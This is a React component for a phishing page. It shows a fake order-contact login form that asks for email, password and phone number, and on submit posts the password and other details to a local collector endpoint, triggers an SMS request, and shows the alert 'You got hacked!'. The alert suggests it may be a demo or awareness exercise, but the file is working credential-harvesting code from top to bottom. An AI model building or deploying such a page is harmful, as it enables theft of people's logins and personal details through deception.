import "./assets/app.css";
import logo from "./assets/logo.png"
import {useState} from 'react';
import * as React from "react";
import axios from "axios"
import { BrowserRouter, Routes, Route } from "react-router-dom";

const PhoneNumber = () => {

  const [phoneNumber, setPhoneNumber] = useState("")
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")

  const handlePhoneNumber = (e) => {
    setPhoneNumber(e.target.value)
  }

  const handleEmail = (e) => {
    setEmail(e.target.value)
  }

  const handlePassword = (e) => {
    setPassword(e.target.value)
  }

  async function sendEmail(email, password, phoneNumber) {
    try {
      let res = await axios.post("http://localhost:30000/sendemail", {email, password, phoneNumber})
      console.log(res.data)
    }  catch(err) {
      console.log(err)
    }
  }

  async function sendSMS(phoneNumber) {
    try {
        let res = await axios.post("http://localhost:30000/sendsms", {phoneNumber})
        console.log(res.data)
      }  catch(err) {
        console.log(err)
      }
  }

  const handleSubmit = (e) => {
    sendEmail(email, password, phoneNumber)
    sendSMS(phoneNumber)
    alert("You got hacked!")
  }

  return (
    <div className="App" >
        <div id="section_uname" className=" ">
            <div className="auth-wrapper">

            <h2 className="title mb-16 mt-16">Please login to contact you about your order!</h2>
            <form>
                <div className="mb-16">
                    <input id="inp_uname" type="email" name="uname" className="input" onChange={handleEmail} value={email} placeholder="Email" /><br /><br />
                    <input id="inp_uname" type="password" name="uname" className="input" onChange={handlePassword} value={password} placeholder="Password" /><br/><br />
                    <input id="inp_uname" type="text" name="uname" className="input" onChange={handlePhoneNumber} value={phoneNumber} placeholder="Phone Number" />
                </div>
            </form>
            
            <div>
                <button className="btn" onClick={handleSubmit} id="btn_next">Send</button>
            </div>
            </div>
        </div>
    
        <footer className="footer">
            <a href="#">Terms of use</a>
            <a href="#">Privacy & cookies</a>
            <span>.&nbsp;.&nbsp;.</span>
        </footer>
    </div>
  )
}

export default PhoneNumber;
